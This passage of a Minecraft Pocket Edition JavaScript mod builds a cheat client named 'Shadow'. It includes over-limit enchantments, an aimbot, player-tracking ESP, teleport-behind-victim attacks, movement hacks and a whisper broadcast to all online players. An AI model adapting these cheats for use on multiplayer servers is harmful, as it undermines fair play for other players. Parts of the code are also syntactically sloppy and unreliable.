.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

effects = new android.widget.PopupWindow(eLayout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);

effects.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.TRANSPARENT);
bg.setStroke(3, android.graphics.Color.CYAN);
eLayout1.setPadding(20, 0, 20, 0);

effects.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

function enchant_menu() {
MainActivity.runOnUiThread(new java.lang.Runnable({
run: function () {

try {
var e2Layout = new android.widget.LinearLayout(MainActivity);
var e2Scroll = new android.widget.HorizontalScrollView(MainActivity);
var e2Layout1 = new android.widget.LinearLayout(MainActivity);
e2Layout.setOrientation(android.widget.LinearLayout.HORIZONTAL);
e2Layout1.setOrientation(android.widget.LinearLayout.HORIZONTAL);
e2Scroll.addView(e2Layout);
e2Layout1.addView(e2Scroll);

var exit = new styleButton();
exit.setText("Back");
exit.setTextColor(android.graphics.Color.RED);
exit.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (viewarg) {
enchants.dismiss();
mainMenu();
}
}));
e2Layout.addView(exit);

function godsword() {
if (Player.getSelectedSlotId() != null) {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";
Player.enchant(Player.getSelectedSlotId(), Enchantment.FIRE_ASPECT, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.KNOCKBACK, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.LOOTING, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.SHARPNESS, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING, lvl);
//Player.setLevel(Math.round(lvl));
Player.setItemCustomName(Player.getSelectedSlotId(), "Shadow sword");
}
}

function godpickaxe() {
if (Player.getSelectedSlotId() != null) {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";
var fortuneLvl = "80";
Player.enchant(Player.getSelectedSlotId(), Enchantment.EFFICIENCY, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.FORTUNE, fortuneLvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING, lvl);
//Player.setLevel(Math.round(lvl));
Player.setItemCustomName(Player.getSelectedSlotId(), "Shadow pickaxe");
}
}

function godaxe() {
if (Player.getSelectedSlotId() != null) {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";
var fortuneLvl = "80";
Player.enchant(Player.getSelectedSlotId(), Enchantment.EFFICIENCY, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.FORTUNE, fortuneLvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING, lvl);
//Player.setLevel(Math.round(lvl));
Player.setItemCustomName(Player.getSelectedSlotId(), "Shadow axe");
}
}

function godbow() {
if (Player.getSelectedSlotId() != null) {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";
var flamelvl = '80';
Player.enchant(Player.getSelectedSlotId(), Enchantment.FLAME, flamelvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.PUNCH, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.INFINITY, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING, lvl);
//Player.setLevel(Math.round(lvl));
Player.setItemCustomName(Player.getSelectedSlotId(), "Shadow bow");
}
}

function godtrident() {
if (Player.getSelectedSlotId() != null) {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";

}
}

function godarmor() {
if (Player.getSelectedSlotId() != null) {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";
Player.enchant(Player.getSelectedSlotId(), Enchantment.PROTECTION, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.THORNS, lvl);
Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING, lvl);
//Player.setLevel(Math.round(lvl));
Player.setItemCustomName(Player.getSelectedSlotId(), "Shadow armor");
}
}

function wearGodArmor() {
if(newmax)var lvl = "29000";
if(!newmax)var lvl = "32767";
if (Player.getArmorSlot(0) != null) {
Player.enchant(Player.getArmorSlot(0), Enchantment.PROTECTION, lvl);
Player.enchant(Player.getArmorSlot(0), Enchantment.THORNS, lvl);
Player.enchant(Player.getArmorSlot(0), Enchantment.UNBREAKING, lvl);
Player.setItemCustomName(Player.getArmorSlot(0), "Shadow helmet");
}
if (Player.getArmorSlot(1) != null) {
Player.enchant(Player.getArmorSlot(1), Enchantment.PROTECTION, lvl);
Player.enchant(Player.getArmorSlot(1), Enchantment.THORNS, lvl);
Player.enchant(Player.getArmorSlot(1), Enchantment.UNBREAKING, lvl);
Player.setItemCustomName(Player.getArmorSlot(1), "Shadow chestplate");
}
if (Player.getArmorSlot(2) != null) {
Player.enchant(Player.getArmorSlot(2), Enchantment.PROTECTION, lvl);
Player.enchant(Player.getArmorSlot(2), Enchantment.THORNS, lvl);
Player.enchant(Player.getArmorSlot(2), Enchantment.UNBREAKING, lvl);
Player.setItemCustomName(Player.getArmorSlot(2), "Shadow pants");
}
if (Player.getArmorSlot(3) != null) {
Player.enchant(Player.getArmorSlot(3), Enchantment.PROTECTION, lvl);
Player.enchant(Player.getArmorSlot(3), Enchantment.THORNS, lvl);
Player.enchant(Player.getArmorSlot(3), Enchantment.UNBREAKING, lvl);
Player.setItemCustomName(Player.getArmorSlot(3), "Shadow boots");
}
}

var enchants_0 = [];
var enchants0 = {
select: [0, -1],
list: [["God sword"],["God pickaxe"],["God axe"],["God bow"],["God trident"],["God armor (holding)"],["God armor (wearing)"]]
}
enchants0.list.forEach(function (entry, index) {
enchants_0.push(enchants0.list[index][0]);
});

var adapter = new android.widget.ArrayAdapter(MainActivity, android.R.layout.simple_list_item_1, enchants_0);

var e0 = new styleButton();
e0.setText("Max enchants");
e0.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (v) {
var alert = new android.app.AlertDialog.Builder(MainActivity);
alert.setTitle("Select enchant");
alert.setAdapter(adapter, new android.content.DialogInterface.OnClickListener({
onClick: function (v, pos) {
if(pos == 0)godsword();
if(pos == 1)godpickaxe();
if(pos == 2)godaxe();
if(pos == 3)godbow();
if(pos == 4)godtrident();
if(pos == 5)godarmor();
if(pos == 6)wearGodArmor();
}
}));
var dialog = alert.create();
dialog.show();
}
});
e2Layout.addView(e0);

var ade = new styleButton();
ade.setText("Add XP");
ade.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
exp("Level", "Add EXP");
}
}));
e2Layout.addView(ade);

var e1 = new styleButton();
e1.setText("Aqua affinity");
e1.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(1, "Level", "Set enchant");
}
}));
e2Layout.addView(e1);

var e2 = new styleButton();
e2.setText("Bane of arthropods");
e2.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(2, "Level", "Set enchant");
}
}));
e2Layout.addView(e2);

var e3 = new styleButton();
e3.setText("Blast protection");
e3.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(3, "Level", "Set enchant");
}
}));
e2Layout.addView(e3);

var e4 = new styleButton();
e4.setText("Depth strider");
e4.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(4, "Level", "Set enchant");
}
}));
e2Layout.addView(e4);

var e5 = new styleButton();
e5.setText("Efficiency");
e5.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(5, "Level", "Set enchant");
}
}));
e2Layout.addView(e5);

var e6 = new styleButton();
e6.setText("Feather falling");
e6.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(6, "Level", "Set enchant");
}
}));
e2Layout.addView(e6);

var e7 = new styleButton();
e7.setText("Fire aspect");
e7.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(7, "Level", "Set enchant");
}
}));
e2Layout.addView(e7);

var e8 = new styleButton();
e8.setText("Fire protection");
e8.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(8, "Level", "Set enchant");
}
}));
e2Layout.addView(e8);

var e9 = new styleButton();
e9.setText("Flame");
e9.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(9, "Level", "Set enchant");
}
}));
e2Layout.addView(e9);

var e10 = new styleButton();
e10.setText("Fortune");
e10.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(10, "Level", "Set enchant");
}
}));
e2Layout.addView(e10);

var e11 = new styleButton();
e11.setText("Frost walker");
e11.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(11, "Level", "Set enchant");
}
}));
e2Layout.addView(e11);

var e12 = new styleButton();
e12.setText("Infinity");
e12.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(12, "Level", "Set enchant");
}
}));
e2Layout.addView(e12);

var e13 = new styleButton();
e13.setText("Knockback");
e13.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(13, "Level", "Set enchant");
}
}));
e2Layout.addView(e13);

var e14 = new styleButton();
e14.setText("Looting");
e14.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(14, "Level", "Set enchant");
}
}));
e2Layout.addView(e14);

var e15 = new styleButton();
e15.setText("Luck of the sea");
e15.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(15, "Level", "Set enchant");
}
}));
e2Layout.addView(e15);

var e16 = new styleButton();
e16.setText("Lure");
e16.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(16, "Level", "Set enchant");
}
}));
e2Layout.addView(e16);

var e17 = new styleButton();
e17.setText("Mending");
e17.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(17, "Level", "Set enchant");
}
}));
e2Layout.addView(e17);

var e18 = new styleButton();
e18.setText("Power");
e18.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(18, "Level", "Set enchant");
}
}));
e2Layout.addView(e18);

var e19 = new styleButton();
e19.setText("Projectile protection");
e19.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(19, "Level", "Set enchant");
}
}));
e2Layout.addView(e19);

var e20 = new styleButton();
e20.setText("Protection");
e20.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(20, "Level", "Set enchant");
}
}));
e2Layout.addView(e20);

var e21 = new styleButton();
e21.setText("Punch");
e21.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(21, "Level", "Set enchant");
}
}));
e2Layout.addView(e21);

var e22 = new styleButton();
e22.setText("Respiration");
e22.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(22, "Level", "Set enchant");
}
}));
e2Layout.addView(e22);

var e23 = new styleButton();
e23.setText("Sharpness");
e23.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(23, "Level", "Set enchant");
}
}));
e2Layout.addView(e23);

var e24 = new styleButton();
e24.setText("Silk touch");
e24.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(24, "Level", "Set enchant");
}
}));
e2Layout.addView(e24);

var e25 = new styleButton();
e25.setText("Smite");
e25.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(25, "Level", "Set enchant");
}
}));
e2Layout.addView(e25);

var e26 = new styleButton();
e26.setText("Thorns");
e26.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(26, "Level", "Set enchant");
}
}));
e2Layout.addView(e26);

var e27 = new styleButton();
e27.setText("Unbreaking");
e27.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(27, "Level", "Set enchant");
}
}));
e2Layout.addView(e27);

var e28 = new styleButton();
e28.setText("Impaling");
e28.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(28, "Level", "Set enchant");
}
}));
e2Layout.addView(e28);

var e29 = new styleButton();
e29.setText("Riptide");
e29.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(29, "Level", "Set enchant");
}
}));
e2Layout.addView(e29);

var e30 = new styleButton();
e30.setText("Channeling");
e30.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(30, "Level", "Set enchant");
}
}));
e2Layout.addView(e30);

var e31 = new styleButton();
e31.setText("Loyalty");
e31.setOnClickListener(new android.view.View.OnClickListener({
onClick: function (v) {
enchants.dismiss();
enchant(31, "Level", "Set enchant");
}
}));
e2Layout.addView(e31);

function enchant(we, hint, button) {
ctx.runOnUiThread(new java.lang.Runnable() ,{
run: function () {
showMenuBtn();
try {
var editor = new android.widget.PopupWindow();
var layout = new android.widget.LinearLayout(ctx);
var input = new styleInput();
input.setInputType(android.text.InputType.TYPE_CLASS_NUMBER);
var Exit = new styleButton();
layout.setOrientation(android.widget.LinearLayout.VERTICAL);
layout.addView(input);
layout.addView(Exit);
input.setText("");
input.setHint(hint);
Exit.setText(button);
Exit.setOnClickListener(new android.view.View.OnClickListener() ,{
onClick: function (view) {
ench = input.getText();
if(typeof(parseInt(ench)) == "number"){
if(legalenchant){
if(ench > 5){
clientMessage("illegal enchant detected.");
ench = 5;
}
}
if(we == 1)Player.enchant(Player.getSelectedSlotId(), Enchantment.AQUA_AFFINITYA, ench);
if(we == 2)Player.enchant(Player.getSelectedSlotId(), Enchantment.BANE_OF_ARTHROPODS, ench);
if(we == 3)Player.enchant(Player.getSelectedSlotId(), Enchantment.BLAST_PROTECTION, ench);
if(we == 4)Player.enchant(Player.getSelectedSlotId(), Enchantment.DEPTH_STRIDER, ench);
if(we == 5)Player.enchant(Player.getSelectedSlotId(), Enchantment.EFFICIENCY, ench);
if(we == 6)Player.enchant(Player.getSelectedSlotId(), Enchantment.FEATHER_FALLING, ench);
if(we == 7)Player.enchant(Player.getSelectedSlotId(), Enchantment.FIRE_ASPECT, ench);
if(we == 8)Player.enchant(Player.getSelectedSlotId(), Enchantment.FIRE_PROTECTION, ench);
if(we == 9)Player.enchant(Player.getSelectedSlotId(), Enchantment.FLAME, ench);
if(we == 10)Player.enchant(Player.getSelectedSlotId(), Enchantment.FORTUNE, ench);
if(we == 11)Player.enchant(Player.getSelectedSlotId(), Enchantment.FROST_WALKER, ench);
if(we == 12)Player.enchant(Player.getSelectedSlotId(), Enchantment.INFINITY, ench);
if(we == 13)Player.enchant(Player.getSelectedSlotId(), Enchantment.KNOCKBACK, ench);
if(we == 14)Player.enchant(Player.getSelectedSlotId(), Enchantment.LOOTING, ench);
if(we == 15)Player.enchant(Player.getSelectedSlotId(), Enchantment.LUCK_OF_THE_SEA, ench);
if(we == 16)Player.enchant(Player.getSelectedSlotId(), Enchantment.LURE, ench);
if(we == 17)Player.enchant(Player.getSelectedSlotId(), Enchantment.MENDING, ench);
if(we == 18)Player.enchant(Player.getSelectedSlotId(), Enchantment.POWER, ench);
if(we == 19)Player.enchant(Player.getSelectedSlotId(), Enchantment.PROJECTILE_PROTECTION, ench);
if(we == 20)Player.enchant(Player.getSelectedSlotId(), Enchantment.PROTECTION, ench);
if(we == 21)Player.enchant(Player.getSelectedSlotId(), Enchantment.PUNCH, ench);
if(we == 22)Player.enchant(Player.getSelectedSlotId(), Enchantment.RESPIRATION, ench);
if(we == 23)Player.enchant(Player.getSelectedSlotId(), Enchantment.SHARPNESS, ench);
if(we == 24)Player.enchant(Player.getSelectedSlotId(), Enchantment.SILK_TOUCH, ench);
if(we == 25)Player.enchant(Player.getSelectedSlotId(), Enchantment.SMITE, ench);
if(we == 26)Player.enchant(Player.getSelectedSlotId(), Enchantment.THORNS, ench);
if(we == 27)Player.enchant(Player.getSelectedSlotId(), Enchantment.UNBREAKING, ench);
if(we == 28)Player.enchant(Player.getSelectedSlotId(), Enchantment.IMPALING, ench);
if(we == 29)Player.enchant(Player.getSelectedSlotId(), Enchantment.RIPTIDE, ench);
if(we == 30)Player.enchant(Player.getSelectedSlotId(), Enchantment.CHANNELING, ench);
if(we == 31)Player.enchant(Player.getSelectedSlotId(), Enchantment.LOYALTY, ench);
} else {
clientMessage("Invalid input.");
}
editor.dismiss();
}
});

editor = new android.widget.PopupWindow(layout, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT, true);

editor.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

editor.showAtLocation(ctx.getWindow()
.getDecorView(), android.view.Gravity.CENTER, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
});
}

enchants = new android.widget.PopupWindow(e2Layout1, android.widget.LinearLayout.LayoutParams.FILL_PARENT, android.widget.LinearLayout.LayoutParams.WRAP_CONTENT);

enchants.setBackgroundDrawable(new android.graphics.drawable.ColorDrawable(android.graphics.Color.TRANSPARENT));

var bg = new android.graphics.drawable.GradientDrawable();	bg.setColor(android.graphics.Color.TRANSPARENT);
bg.setStroke(3, android.graphics.Color.CYAN);
e2Layout1.setPadding(20, 0, 20, 0);

enchants.showAtLocation(MainActivity.getWindow()
.getDecorView(), android.view.Gravity.TOP, 0, 0);
} catch (error) {
android.widget.Toast.makeText(MainActivity, error, 1)
.show();
}

}
}));
}

/*
*
============
code
============
*
*/

function chatHook(str){
/*
I code discord bots don't start saying i skidded this shit from some crappy command mod.
*/
var command = str.toLowerCase();
var args = command.split(" ");
if(args[0] == prefix+"help"){
preventDefault();
if(args[1] == null || args[1] == 1){
clientMessage("§b- Help page 1/1 -§r\nhelp\n§aCommand list.\nmenu\n§aOpen Shadow.\naimbot\n§aLock onto players.\nesp\n§aPlayer tracers.\nhud\n§aDisplay HUD\nbind\n§aToggle keybind.");
}
if(args[1] <= 1){
if(args[1] == 1){
clientMessage("§b- Help page 1/1 -§r\nhelp\n§aCommand list.\nmenu\n§aOpen Shadow.\naimbot\n§aLock onto players.\nesp\n§aPlayer tracers.\nhud\n§aDisplay HUD\nbind\n§aToggle keybind.");
}
} else {
clientMessage("§cHelp page limit reached.");
}
}
if(args[0] == prefix+"menu"){
if(ctx.getPackageName() == "net.zhuoweizhang.mcpelauncher" || ctx.getPackageName() == "net.zhuoweizhang.mcpelauncher.pro" || ctx.getPackageName() == "tk.depresso.Shadowlauncher"){
if(bool != 1){
if(GUI.isShowing()){
mainMenu();
GUI.dismiss();
}
}
}
preventDefault();
}
if(args[0] == prefix+"aimbot"){
aimbot ? aimbot = false : aimbot = true;
if(aimbot == true)clientMessage(pre+"Aimbot on.");
if(aimbot == false)clientMessage(pre+"Aimbot off.");
preventDefault();
}
if(args[0] == prefix+"esp"){
esp1 ? esp1 = false : esp1 = true;
if(esp1 == true)clientMessage(pre+"Tracers on.");
if(esp1 == false)clientMessage(pre+"Tracers off.");
preventDefault();
}
if(args[0] == prefix+"hud"){
hud ? hud = false : hud = true;
if(hud == true)clientMessage(pre+"HUD on.");
if(hud == false)clientMessage(pre+"HUD off.");
preventDefault();
}
if(args[0] == prefix+"bind"){
keybind ? keybind = false : keybind = true;
if(keybind == true){
clientMessage(pre+"Keybinds on.");
showKeys();
}
if(keybind == false){
clientMessage(pre+"Keybinds off.");
keyGui.dismiss();
}
preventDefault();
}
}

function getNearestEntity(maxrange) {
	var mobs = Entity.getAll();
	var small = maxrange;
	var ent = null;
	if (mobs != null) {
		for (var i = 0; i < mobs.length; i++) {
			var x = Entity.getX(mobs[i]) - getPlayerX();
			var y = Entity.getY(mobs[i]) - getPlayerY();
			var z = Entity.getZ(mobs[i]) - getPlayerZ();
			var dist = Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2) + Math.pow(z, 2));
			if (dist < small && dist > 0 && Entity.getHealth(mobs[i]) >= 1) {
				small = dist;
				ent = mobs[i];
			}
		}
		return ent;
	}
}

function getNearestPlayer(maxrange) {
	var players = Server.getAllPlayers();
	var small = maxrange;
	var ent = null;
	if (players != null) {
		for (var i = 0; i < players.length; i++) {
			var x = Entity.getX(players[i]) - getPlayerX();
			var y = Entity.getY(players[i]) - getPlayerY();
			var z = Entity.getZ(players[i]) - getPlayerZ();
			var dist = Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2) + Math.pow(z, 2));
			if (dist < small && dist > 0 && Entity.getHealth(players[i]) >= 1) {
				small = dist;
				ent = players[i];
			}
		}
		return ent;
	}
}

function getRandPlayer(maxrange) {
	var players = Server.getAllPlayers();
	var small = maxrange;
	var ent = null;
	if (players != null) {
var p = players[Math.floor(Math.random() * players.length)];
			var x = Entity.getX(p) - getPlayerX();
			var y = Entity.getY(p) - getPlayerY();
			var z = Entity.getZ(p) - getPlayerZ();
			var dist = Math.sqrt(Math.pow(x, 2) + Math.pow(y, 2) + Math.pow(z, 2));
			if (dist < small && dist > 0 && Entity.getHealth(p) >= 1) {
				small = dist;
				ent = p;
			}
		return ent;
	}
}

function crosshairAimAt(ent, pos) {
	if (ent != null) {
		var x = parseInt(Entity.getX(ent) - getPlayerX());
		var y = parseInt(Entity.getY(ent) - getPlayerY());
		var z = parseInt(Entity.getZ(ent) - getPlayerZ());
		if (pos != null && pos instanceof Array) {
			x = parseInt(Entity.getX(ent) - pos[0]);
			y = parseInt(Entity.getY(ent) - pos[1]);
			z = parseInt(Entity.getZ(ent) - pos[2]);
		}
		if (Entity.getEntityTypeId(ent) != 63) y += 0.5;
		var a = 0.5 + Entity.getX(ent);
		var b = Entity.getY(ent);
		var c = 0.5 + Entity.getZ(ent);
		var len = Math.sqrt(x * x + y * y + z * z);
		var y = y / len;
		var pitch = Math.asin(y);
		pitch = pitch * 180.0 / Math.PI;
		pitch = -pitch;
		var yaw = -Math.atan2(a - (Player.getX() + 0.5), c - (Player.getZ() + 0.5)) * (180 / Math.PI);
		if (pitch < 89 && pitch > -89) {
			Entity.setRot(Player.getEntity(), yaw, pitch);
		}
	}
}

function sendToAll(tell){
var online = Server.getAllPlayerNames();
for(var i = 0; i < online.length; i++){
Server.sendChat("./w "+online[i]+" "+tell);
}
}

function instantBreak(){
for(var i = 0; i < 217; i++){
Block.setDestroyTime(i, 0.1);
}
}

function defaultBreak() {
for(var i = 0; i < 217; i++){
Block.setDestroyTime(i, 0.8);
}
}

function entityAddedHook(entity) {

if(find) {
if(entity != null){
var eid = Entity.getEntityTypeId(entity);
if(eid == 63){
var x = Math.floor(Entity.getX(entity));
var y = Math.floor(Entity.getY(entity));
var z = Math.floor(Entity.getZ(entity));
var name = Entity.getNameTag(entity);
clientMessage(pre + "Player in range:\n" + name + " / " + eid + "\nx: " + x + ", y: " + y + ", z: " + z);
}
}
}

}

function entityRemovedHook(entity) {

if(find) {
if(entity != null){
var eid = Entity.getEntityTypeId(entity);
if(eid == 63){
var x = Math.floor(Entity.getX(entity));
var y = Math.floor(Entity.getY(entity));
var z = Math.floor(Entity.getZ(entity));
var name = Entity.getNameTag(entity);
clientMessage(pre + "Player left range:\n" + name + " / " + eid + "\nx: " + x + ", y: " + y + ", z: " + z);
}
}
}

}

function useItem(x, y, z, itemId, blockId, side, itemDamage, blockDamage) {
if(tower){
if(getPitch() >= 70 && Player.getCarriedItem() != 0){
Entity.setVelY(Player.getEntity(), 0.3);
}
}
if(bridge){
var yaw = getYaw();
if(getPitch() >= 40 && getPitch() <= 85 && Player.getCarriedItem() != 0){
Entity.setPosition(Player.getEntity(), x, y+2.62, z);
}
}
if(taptp){
Entity.setPosition(Player.getEntity(), x, y+2.62, z);
}
if(tapjump){
Entity.setVelY(getPlayerEnt(), 0.4);
}
}

function attackHook(attacker, victim) {
if(hitjump){
if(victim)setVelY(getPlayerEnt(), 0.5);
}
if(behind){
if(victim){
var yaw = Entity.getYaw(victim);
var x = Entity.getX(victim);
var y = Entity.getY(victim);
var z = Entity.getZ(victim);
/*
-45 & 44 = +z
-133 & -43 = +x
136 & -132 = -z
45 & 135 = -x
*/
if(Shadow.yawDir(0, yaw)){
if(getTile(x, y-2, z-2) != 10 || getTile(x, y-2, z-2) != 11){
Entity.setPosition(Player.getEntity(), x, y+1.62, z-2);
}
}
if(Shadow.yawDir(1, yaw)){
if(getTile(x-2, y-2, z) != 10 || getTile(x-2, y-2, z) != 11){
Entity.setPosition(Player.getEntity(), x-2, y+1.62, z);
}
}
if(Shadow.yawDir(2, yaw)){
if(getTile(x, y-2, z+2) != 10 || getTile(x, y-2, z+2) != 11){
Entity.setPosition(Player.getEntity(), x, y+1.62, z+2);
}
}
if(Shadow.yawDir(3, yaw)){
if(getTile(x+2, y-2, z) != 10 || getTile(x+2, y-2, z) != 11){
Entity.setPosition(Player.getEntity(), x+2, y+1.62, z);
}
}
}
}
if(grapple){
if(victim){
var x = Entity.getX(victim);
var y = Entity.getY(victim);
var z = Entity.getZ(victim);
Entity.setPosition(Player.getEntity(), x, y+1.62, z);
}
}
if(saddle)rideAnimal(attacker, victim);
}

function modTick(){
cd = new Date;
if(Math.floor(parseInt(cd.getMinutes()-7)) == Math.floor(parseInt(min))){
min = 0;
min = cd.getMinutes();
discord("Follow twitter");
}
if (autosword) {
if (getNearestPlayer(aimrange) != null) {
let bestsword = [-1, -1];
for (let i = 0; i < 10; i++) {
let dmg = Shadow.sortSword(Player.getInventorySlot(i));
if (dmg > bestsword[0]) {
bestsword[0] = dmg;
bestsword[1] = i;
}
if (bestsword[1] != -1)Player.setSelectedSlotId(bestsword[1]);
}
}
}
if (bhop) {
var x = getPlayerX();
var y = getPlayerY();
var z = getPlayerZ();
if (Entity.getVelX(Player.getEntity()) > 0.1 && getTile(x, y + 2, z) == 0) {
if(getTile(x, y - 2, z) > 0) {
Entity.setVelY(Player.getEntity(), 0.5);
}
}
if (Entity.getVelX(Player.getEntity()) < -0.1 && getTile(x, y + 2, z) == 0) {
if (getTile(Player.getX(), Player.getY() - 2, Player.getZ()) > 0) {
Entity.setVelY(Player.getEntity(), 0.5);
}
}
if (Entity.getVelZ(Player.getEntity()) > 0.1 && getTile(x, y + 2, z) == 0) {
if (getTile(Player.getX(), Player.getY() - 2, Player.getZ()) > 0) {
Entity.setVelY(Player.getEntity(), 0.5);
}
}
if (Entity.getVelZ(Player.getEntity()) < -0.1 && getTile(x, y + 2, z) == 0) {
if (getTile(Player.getX(), Player.getY() - 2, Player.getZ()) > 0) {
Entity.setVelY(Player.getEntity(), 0.5);
}
}
}
if (spider) {
if (getTile(Player.getX() + 1, Player.getY(), Player.getZ()) > 0 || getTile(Player.getX() -1, Player.getY(), Player.getZ()) > 0 || getTile(Player.getX(), Player.getY(), Player.getZ() +1) > 0 || getTile(Player.getX(), Player.getY(), Player.getZ() -1) > 0 || getTile(Player.getX() + 1, Player.getY(), Player.getZ() - 1) > 0 || getTile(Player.getX() - 1, Player.getY(), Player.getZ() + 1) > 0 || getTile(Player.getX() -1, Player.getY(), Player.getZ() -1) > 0 || getTile(Player.getX() +1, Player.getY(), Player.getZ() +1) > 0) {
setVelY(Player.getEntity(), 0.6);
}
}
if (autowalk) {
Shadow.toDirectionalVector(pdir, (getYaw() + 90) * Shadow.deg_to_rad(), getPitch() * Shadow.deg_to_rad() * -1);
setVelX(getPlayerEnt(), 0.22 * pdir[0]);
setVelZ(getPlayerEnt(), 0.22 * pdir[2]);
}
if (glide) {
if (Entity.getVelY(Player.getEntity()) <= 0) {
setVelY(Player.getEntity(), -0.05);
}
}
if(hud){
var x = Math.floor(getPlayerX());
var y = Math.floor(getPlayerY());
var z = Math.floor(getPlayerZ());
var item = Player.getCarriedItem();
var count = Player.getCarriedItemCount();
var meta = Player.getCarriedItemData();
var world = Level.getWorldName();
var time = Math.floor(Level.getTime());
var pitch = Math.floor(getPitch(getPlayerEnt()));
var yaw = Math.floor(getYaw(getPlayerEnt()));
if(rainbow)var color = Shadow.rainbow();
if(rainbow == false)var color = "";
var ent = getPlayerEnt();
var armor = "H: "+Shadow.handleArmor(ent, 0)+"C: "+Shadow.handleArmor(ent, 1)+"P: "+Shadow.handleArmor(ent, 2)+"B: "+Shadow.handleArmor(ent, 3);
if(Math.floor(parseInt(Entity.getVelX(getPlayerEnt()))) != 0 || Math.floor(parseInt(Entity.getVelZ(getPlayerEnt()))) != 0 && imoved == "yes"){
imoved = "no";
}
if(Math.floor(parseInt(Entity.getVelX(getPlayerEnt()))) == 0 || Math.floor(parseInt(Entity.getVelZ(getPlayerEnt()))) == 0 && imoved == "no"){
imoved = "yes";
}
/*
-45 & 45 = +z
-135 & -44 = +x
131 & -134 = -z
45 & 130 = -x
*/
if(Shadow.yawDir(0, yaw))compass = "E";
if(Shadow.yawDir(1, yaw))compass = "S";
if(Shadow.yawDir(2, yaw))compass = "W";
if(Shadow.yawDir(3, yaw))compass = "N";
if(side){
